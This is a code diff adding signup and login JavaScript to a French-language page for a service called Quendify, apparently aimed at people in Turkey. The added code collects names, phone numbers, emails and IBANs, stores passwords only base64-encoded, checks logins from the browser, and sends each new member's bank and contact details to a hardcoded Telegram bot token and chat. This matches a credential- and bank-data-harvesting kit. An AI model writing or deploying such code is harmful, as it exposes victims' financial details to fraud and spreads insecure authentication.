@@ -356,3 +356,120 @@ async function resendOtp(){
   toast('Nouveau code envoyé','ok');
   startResendTimer();
 }
+
+// ===================== TIMER RENVOI =====================
+function startResendTimer(){
+  resendCooldown=60;
+  const link=$('resend-link'); const timer=$('resend-timer');
+  link.classList.add('disabled');
+  const iv=setInterval(()=>{
+    resendCooldown--;
+    timer.textContent=resendCooldown>0?`(${resendCooldown}s)`:'';
+    if(resendCooldown<=0){ link.classList.remove('disabled'); clearInterval(iv); }
+  },1000);
+}
+
+// ===================== VALIDATION ÉTAPE 2 =====================
+function validateStep2(){
+  let ok=true;
+  const name=$('su-name').value.trim();
+  const wa=$('su-wa').value.trim();
+  const code=$('su-code').value;
+  if(!name){ showErr('su-name-err','Champ requis.'); ok=false; } else hideErr('su-name-err');
+  if(!wa){ showErr('su-wa-err','Champ requis.'); ok=false; } else hideErr('su-wa-err');
+  if(code.length<6){ showErr('su-code-err','Minimum 6 caractères.'); ok=false; } else hideErr('su-code-err');
+  return ok;
+}
+
+// ===================== INSCRIPTION FINALE =====================
+async function finishSignup(){
+  const iban=$('su-iban').value.trim();
+  const recv=$('su-recv').value.trim();
+  if(!iban){ showErr('su-iban-err','IBAN requis.'); return; } else hideErr('su-iban-err');
+  if(!recv){ showErr('su-recv-err','Numéro requis.'); return; } else hideErr('su-recv-err');
+
+  const btn=$('su-finish'); btn.textContent='Création…'; btn.disabled=true;
+
+  const payload={
+    full_name: $('su-name').value.trim(),
+    email: verifiedEmail,
+    phone: $('su-wa').value.trim(),
+    whatsapp: $('su-wa').value.trim(),
+    password_hash: btoa($('su-code').value),
+    iban_try: iban,
+    reception_number: recv,
+    country: 'Turquie',
+    email_verified: true
+  };
+
+  const {data,error}=await sb.from('quendify_users').insert([payload]).select().single();
+  btn.textContent='Créer mon accès ✦'; btn.disabled=false;
+
+  if(error){ toast('Erreur : '+error.message,'err'); return; }
+
+  localStorage.setItem('qnd_member', JSON.stringify(data));
+  $('ok-mid').textContent='QND-'+String(data.id).substring(0,5).toUpperCase();
+  goSignup('ok');
+
+  // Telegram
+  await sendTelegram(`🆕 *NOUVEAU MEMBRE*\n👤 ${payload.full_name}\n📧 ${payload.email}\n📱 ${payload.phone}\n🏦 IBAN: ${iban}\n📲 Réception: ${recv}`);
+}
+
+// ===================== CONNEXION =====================
+async function doLogin(){
+  const email=$('li-email').value.trim().toLowerCase();
+  const code=$('li-code').value;
+  hideErr('li-err');
+  if(!isEmail(email)||!code){ showErr('li-err','Remplis tous les champs.'); return; }
+
+  const btn=$('li-btn'); btn.textContent='Connexion…'; btn.disabled=true;
+  const {data,error}=await sb.from('quendify_users')
+    .select('*').eq('email',email).eq('password_hash',btoa(code)).maybeSingle();
+  btn.textContent='Accéder à mon espace'; btn.disabled=false;
+
+  if(error||!data){ showErr('li-err','Email ou code d\'accès incorrect.'); return; }
+
+  localStorage.setItem('qnd_member', JSON.stringify(data));
+  toast('Connexion réussie ✦','ok');
+  setTimeout(()=>enterSpace(), 600);
+}
+
+// ===================== ENTRÉE ESPACE =====================
+function enterSpace(){
+  window.location.href = 'espace.html';
+}
+
+// ===================== TELEGRAM =====================
+const TELEGRAM_BOT='8784285691:AAGUyNxKrB5T36Y0o-awPykoQUNYVEh6im0';
+const TELEGRAM_CHAT='1275142753';
+async function sendTelegram(text){
+  try{await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`,{
+    method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:TELEGRAM_CHAT,text,parse_mode:'Markdown'})
+  });}catch(e){}
+}
+
+// ===================== NAVIGATION OTP =====================
+document.addEventListener('DOMContentLoaded',()=>{
+  const boxes=$('otp-boxes').querySelectorAll('input');
+  boxes.forEach((inp,i)=>{
+    inp.addEventListener('input',()=>{
+      if(inp.value&&i<boxes.length-1) boxes[i+1].focus();
+    });
+    inp.addEventListener('keydown',e=>{
+      if(e.key==='Backspace'&&!inp.value&&i>0) boxes[i-1].focus();
+    });
+    inp.addEventListener('paste',e=>{
+      e.preventDefault();
+      const text=e.clipboardData.getData('text').replace(/\D/g,'');
+      [...text].forEach((c,j)=>{ if(boxes[j]) boxes[j].value=c; });
+      if(boxes[Math.min(text.length,boxes.length-1)]) boxes[Math.min(text.length,boxes.length-1)].focus();
+    });
+  });
+
+  // Si déjà connecté -> espace direct
+  if(localStorage.getItem('qnd_member')) enterSpace();
+});
+</script>
+</body>
+</html>
